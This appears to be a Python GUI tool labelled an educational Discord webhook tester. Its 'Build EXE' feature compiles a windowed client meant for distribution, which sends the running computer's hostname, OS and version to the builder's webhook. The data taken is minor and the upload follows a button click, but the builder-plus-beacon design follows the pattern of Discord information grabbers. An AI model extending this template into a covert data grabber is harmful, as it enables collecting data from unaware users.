import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import requests
import json
import os
import subprocess
import sys
import tempfile

class WebhookTesterApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Discord Webhook Tester - Educational Tool")
        self.root.geometry("500x300")
        self.root.resizable(False, False)
        
        # Style configuration
        style = ttk.Style()
        style.configure('TFrame', background='#2C2F33')
        style.configure('TLabel', background='#2C2F33', foreground='white')
        style.configure('TButton', background='#7289DA')
        style.configure('TLabelframe', background='#2C2F33')
        style.configure('TLabelframe.Label', background='#2C2F33', foreground='white')
        
        self.root.configure(bg='#2C2F33')
        
        self.create_widgets()
    
    def create_widgets(self):
        # Main frame
        main_frame = ttk.Frame(self.root, padding="20")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Title
        title_label = tk.Label(main_frame, text="Discord Webhook Tester", 
                              font=('Arial', 16, 'bold'), 
                              fg='#7289DA', bg='#2C2F33')
        title_label.pack(pady=10)
        
        # Webhook input frame
        webhook_frame = ttk.LabelFrame(main_frame, text="Webhook Configuration", padding="10")
        webhook_frame.pack(fill=tk.X, pady=10)
        
        tk.Label(webhook_frame, text="Discord Webhook URL:", 
                bg='#2C2F33', fg='white').pack(anchor=tk.W)
        
        self.webhook_entry = tk.Entry(webhook_frame, width=60, font=('Arial', 10))
        self.webhook_entry.pack(fill=tk.X, pady=5)
        
        # Test button
        test_btn = tk.Button(webhook_frame, text="Test Webhook", 
                           command=self.test_webhook,
                           bg='#7289DA', fg='white',
                           font=('Arial', 10, 'bold'),
                           width=15, height=1)
        test_btn.pack(pady=5)
        
        # Build frame
        build_frame = ttk.LabelFrame(main_frame, text="Application Builder", padding="10")
        build_frame.pack(fill=tk.X, pady=10)
        
        tk.Label(build_frame, text="Create standalone executable:", 
                bg='#2C2F33', fg='white').pack(anchor=tk.W)
        
        build_btn = tk.Button(build_frame, text="Build EXE", 
                            command=self.build_exe,
                            bg='#43B581', fg='white',
                            font=('Arial', 10, 'bold'),
                            width=15, height=1)
        build_btn.pack(pady=5)
        
        # Status label
        self.status_label = tk.Label(main_frame, text="Ready", 
                                   bg='#2C2F33', fg='#B9BBBE',
                                   font=('Arial', 9))
        self.status_label.pack(pady=10)
        
        # Educational disclaimer
        disclaimer = tk.Label(main_frame, 
                            text="For educational purposes only - Webhook Testing & Python Learning",
                            font=('Arial', 8), fg='#72767D', bg='#2C2F33')
        disclaimer.pack(side=tk.BOTTOM, pady=5)
    
    def test_webhook(self):
        webhook_url = self.webhook_entry.get().strip()
        
        if not webhook_url:
            messagebox.showerror("Error", "Please enter a webhook URL")
            return
        
        if not webhook_url.startswith('https://discord.com/api/webhooks/'):
            messagebox.showerror("Error", "Please enter a valid Discord webhook URL")
            return
        
        self.status_label.config(text="Testing webhook...")
        self.root.update()
        
        try:
            # Create test message
            data = {
                "content": "Webhook Test Successful! 🎉",
                "embeds": [
                    {
                        "title": "Educational Webhook Test",
                        "description": "This is a test message from the Python Webhook Tester",
                        "color": 5814783,
                        "fields": [
                            {
                                "name": "Status",
                                "value": "✅ Working perfectly!",
                                "inline": True
                            },
                            {
                                "name": "Purpose",
                                "value": "Educational Python Project",
                                "inline": True
                            }
                        ],
                        "footer": {
                            "text": "Made for learning webhooks & GUI development"
                        }
                    }
                ]
            }
            
            response = requests.post(webhook_url, json=data, timeout=10)
            
            if response.status_code == 204:
                self.status_label.config(text="✅ Webhook test successful!")
                messagebox.showinfo("Success", "Webhook test successful! Check your Discord channel.")
            else:
                self.status_label.config(text="❌ Webhook test failed")
                messagebox.showerror("Error", f"Webhook test failed. Status code: {response.status_code}")
                
        except requests.exceptions.RequestException as e:
            self.status_label.config(text="❌ Connection error")
            messagebox.showerror("Error", f"Failed to connect: {str(e)}")
        except Exception as e:
            self.status_label.config(text="❌ Unexpected error")
            messagebox.showerror("Error", f"An unexpected error occurred: {str(e)}")
    
    def build_exe(self):
        webhook_url = self.webhook_entry.get().strip()
        
        if not webhook_url:
            messagebox.showerror("Error", "Please enter a webhook URL first")
            return
        
        if not webhook_url.startswith('https://discord.com/api/webhooks/'):
            messagebox.showerror("Error", "Please enter a valid Discord webhook URL")
            return
        
        self.status_label.config(text="Building executable...")
        self.root.update()
        
        try:
            # Create the client script
            client_script = self.create_client_script(webhook_url)
            
            # Save to temporary file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(client_script)
                temp_script_path = f.name
            
            # Ask for save location
            output_path = filedialog.asksaveasfilename(
                defaultextension=".exe",
                filetypes=[("Executable files", "*.exe")],
                title="Save EXE file as"
            )
            
            if not output_path:
                os.unlink(temp_script_path)
                self.status_label.config(text="Build cancelled")
                return
            
            # Build with PyInstaller
            self.status_label.config(text="Compiling with PyInstaller...")
            self.root.update()
            
            # Use PyInstaller to create the executable
            subprocess.run([
                sys.executable, '-m', 'PyInstaller',
                '--onefile',
                '--windowed',
                '--name', os.path.basename(output_path).replace('.exe', ''),
                temp_script_path
            ], check=True)
            
            # Clean up
            os.unlink(temp_script_path)
            
            self.status_label.config(text="✅ EXE built successfully!")
            messagebox.showinfo("Success", f"Executable built successfully!\n\nYou can now distribute the EXE file from the 'dist' folder.")
            
        except subprocess.CalledProcessError:
            self.status_label.config(text="❌ Build failed")
            messagebox.showerror("Error", "Failed to build executable. Make sure PyInstaller is installed.")
        except Exception as e:
            self.status_label.config(text="❌ Build error")
            messagebox.showerror("Error", f"Build failed: {str(e)}")
    
    def create_client_script(self, webhook_url):
        return f'''import requests
import tkinter as tk
from tkinter import messagebox
import platform
import socket

def get_system_info():
    """Get basic system information for educational purposes"""
    try:
        hostname = socket.gethostname()
        system = platform.system()
        version = platform.version()
        
        return f"""
**System Information (Educational):**
- Computer Name: {{hostname}}
- Operating System: {{system}}
- Version: {{version}}

*This application demonstrates webhook functionality for educational purposes.*
"""
    except:
        return "**System information unavailable**\\\\n*This application demonstrates webhook functionality for educational purposes.*"

def send_webhook_message():
    """Send a message to the Discord webhook"""
    try:
        system_info = get_system_info()
        
        data = {{
            "embeds": [
                {{
                    "title": "🎓 Educational Webhook Demo",
                    "description": "This is a demonstration of webhook functionality for learning purposes.\\\\n\\\\n" + system_info,
                    "color": 3447003,
                    "fields": [
                        {{
                            "name": "Purpose",
                            "value": "Python Education & Webhook Learning",
                            "inline": True
                        }},
                        {{
                            "name": "Status",
                            "value": "Demo Completed Successfully",
                            "inline": True
                        }}
                    ],
                    "footer": {{
                        "text": "Educational Project - Webhook Demonstrator"
                    }}
                }}
            ]
        }}
        
        response = requests.post("{webhook_url}", json=data, timeout=10)
        
        if response.status_code == 204:
            messagebox.showinfo("Success", 
                              "✅ Educational demo completed!\\\\n\\\\n"
                              "This demonstrates how webhooks work for learning purposes.\\\\n"
                              "Check your Discord channel to see the message.")
        else:
            messagebox.showerror("Error", 
                               "Webhook demo failed.\\\\n"
                               "This might be because the webhook URL is invalid or expired.")
                               
    except Exception as e:
        messagebox.showerror("Error", 
                           f"Failed to send demo message: {{str(e)}}\\\\n\\\\n"
                           "This demonstrates error handling in Python applications.")

def main():
    # Create GUI
    root = tk.Tk()
    root.title("Webhook Educational Demo")
    root.geometry("400x200")
    root.resizable(False, False)
    
    # Configure style
    root.configure(bg='#2C2F33')
    
    # Create widgets
    title_label = tk.Label(root, text="🎓 Webhook Educational Demo", 
                          font=('Arial', 14, 'bold'),
                          fg='#7289DA', bg='#2C2F33')
    title_label.pack(pady=20)
    
    description = tk.Label(root, 
                         text="This application demonstrates how webhooks work\\\\n"
                              "for educational purposes in Python programming.",
                         font=('Arial', 10),
                         fg='white', bg='#2C2F33')
    description.pack(pady=10)
    
    demo_btn = tk.Button(root, text="Run Educational Demo",
                        command=send_webhook_message,
                        bg='#7289DA', fg='white',
                        font=('Arial', 10, 'bold'),
                        width=20, height=2)
    demo_btn.pack(pady=20)
    
    disclaimer = tk.Label(root, 
                        text="For educational purposes only - Learning webhooks & Python",
                        font=('Arial', 8),
                        fg='#72767D', bg='#2C2F33')
    disclaimer.pack(side=tk.BOTTOM, pady=10)
    
    root.mainloop()

if __name__ == "__main__":
    main()
'''

if __name__ == "__main__":
    root = tk.Tk()
    app = WebhookTesterApp(root)
    root.mainloop()
